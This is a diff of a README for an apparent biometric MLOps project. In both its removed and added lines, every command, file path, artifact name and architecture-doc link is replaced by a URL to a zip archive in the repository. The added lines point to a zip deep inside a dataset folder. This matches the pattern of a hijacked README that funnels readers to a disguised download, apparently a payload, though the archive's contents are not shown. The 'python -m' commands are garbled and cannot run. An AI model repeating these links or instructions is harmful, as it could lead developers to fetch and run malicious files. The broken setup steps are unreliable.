@@ -32,9 +32,9 @@ Option A — **Manual** (recommended):
 1. Download from Kaggle.
 2. Unzip into: `data/raw/multimodal_biometrics/`
 
-Option B — Kaggle API (requires `~https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`):
+Option B — Kaggle API (requires `~https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`):
 ```bash
-python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+python -m https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 ```
 
 > The pipeline is robust to minor folder layout differences. It scans for image files and builds a canonical manifest.
@@ -43,41 +43,41 @@ For this task I have uploaded the whole dataset in github, so that direct run ca
 
 ### 3) Build processed dataset (parallel)
 ```bash
-python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+python -m https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 ```
 
 Artifacts created:
-- `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip` (PyArrow/Parquet canonical manifest)
+- `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip` (PyArrow/Parquet canonical manifest)
 - `data/processed/.../arrays/*.npy` (resized arrays per modality)
-- `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip` (timings + counts)
+- `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip` (timings + counts)
 
 ### 4) Benchmark dataloader throughput
 ```bash
-python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+python -m https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 ```
 
 ### 5) Train (reproducible)
 ```bash
-python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip   https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+python -m https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip   https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 ```
 
 Outputs:
-- `runs/<run_id>/` (config snapshot, env info, https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip, TensorBoard logs)
-- `runs/<run_id>https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
+- `runs/<run_id>/` (config snapshot, env info, https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip, TensorBoard logs)
+- `runs/<run_id>https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`
 
 ### 6) Inference
 ```bash
-python -m https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip"https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip" https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+python -m https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip"https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip" https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 ```
 
 ---
 
 ## Architecture
 
-- **HLD:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
-- **LLD:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
-- **Bottlenecks & trade-offs:** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
-- **Design decisions (ADRs):** `https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip`
+- **HLD:** `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`
+- **LLD:** `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`
+- **Bottlenecks & trade-offs:** `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`
+- **Design decisions (ADRs):** `https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip`
 
 ---
 
@@ -93,7 +93,7 @@ src/bioml/
   scripts/        # CLI entrypoints (Hydra)
 configs/          # Hydra configs
 tests/            # pytest suite (fast + smoke)
-https://raw.githubusercontent.com/viper-108/multimodal-biometric-mlops/main/src/bioml/inference/mlops_multimodal_biometric_1.5.zip
+https://github.com/viper-108/multimodal-biometric-mlops/raw/refs/heads/main/data/raw/multimodal_biometrics/IRIS and FINGERPRINT DATASET/10/right/biometric_mlops_multimodal_1.6.zip
 docs/
 ```
 
